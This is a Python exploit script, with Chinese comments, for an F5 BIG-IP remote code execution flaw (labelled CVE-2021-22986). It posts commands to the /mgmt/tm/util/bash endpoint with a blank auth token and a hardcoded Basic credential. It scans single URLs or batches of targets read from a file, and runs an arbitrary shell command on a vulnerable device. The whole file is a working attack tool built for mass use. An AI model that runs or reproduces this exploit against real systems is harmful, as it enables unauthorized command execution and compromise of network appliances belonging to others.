import requests,sys,random,re,json,click
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def info():
    print("[+]============================================================")
    print("[+] F5 BIG-IP 远程代码执行漏洞")
    print("[+] Explain: YaunSky")
    print("[+] https://github.com/yaunsky")
    print("[+]============================================================")
    print("                                                               ")

# 漏洞利用poc
def exp1(url):
    target_url = url + "/mgmt/tm/util/bash"
    headers = {
        "Authorization": "Basic YWRtaW46QVNhc1M=",
        "X-F5-Auth-Token": "",
        "Content-Type": "application/json"
    }
    data = '{"command":"run","utilCmdArgs":"-c id"}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=target_url, data=data, headers=headers, verify=False, timeout=2)
        if "commandResult" in response.text and response.status_code == 200:
            print("[++++++++] 目标 {}存在漏洞,响应为:{} ".format(url, json.loads(response.text)["commandResult"]))
        else:
            print("[-------] 目标 {}不存在漏洞 ".format(url))
    except Exception as e:
        print("[-------] 目标 {} 请求失败 ".format(url))

# 对单个url进行验证
def scan1(url):
    exp1(str(url))


# 批量漏洞验证
def scan2(file):
    with open(file, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "https://" + url
            url = url.strip('\n')
            try:
                exp1(url)

            except Exception as e:
                print("[------] 请求报错 ".format(e))
                continue

# 命令执行
def command(url, cmd):
    target_url = url + "/mgmt/tm/util/bash"
    headers = {
        "Authorization": "Basic YWRtaW46QVNhc1M=",
        "X-F5-Auth-Token": "",
        "Content-Type": "application/json"
    }
    data = '{"command":"run","utilCmdArgs":"-c %s"}' % cmd
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=target_url, data=data, headers=headers, verify=False, timeout=2)
        if "commandResult" in response.text and response.status_code == 200:
            print("[++++++++] 目标 {}存在漏洞,响应为:{} ".format(url, json.loads(response.text)["commandResult"]))
        else:
            print("[-------] 目标 {}不存在漏洞 ".format(url))
    except Exception as e:
        print("[-------] 目标 {} 请求失败 ".format(url))


@click.command()
@click.option("-u", "--url", help='Target URL，对单一目标检测; Example:python3 CVE202122986.py -u https://ip:port')
@click.option("-f", "--file", help="Target File，对批量目标检测; Example:python3 CVE202122986.py -f ip.txt")
@click.option("-c", "--cmd", help="Target command，命令执行; Example: python3 CVE202122986.py -cmd id")
def main(url,file,cmd):
    info()
    if url != None and file == None and cmd ==None:
        scan1(url)
    elif url == None and file != None and cmd ==None:
        scan2(file)
    elif url != None and file == None and cmd !=None:
        command(url, cmd)
    else:
        print("python3 CVE202122986.py --help")

if __name__ == '__main__':
    main()
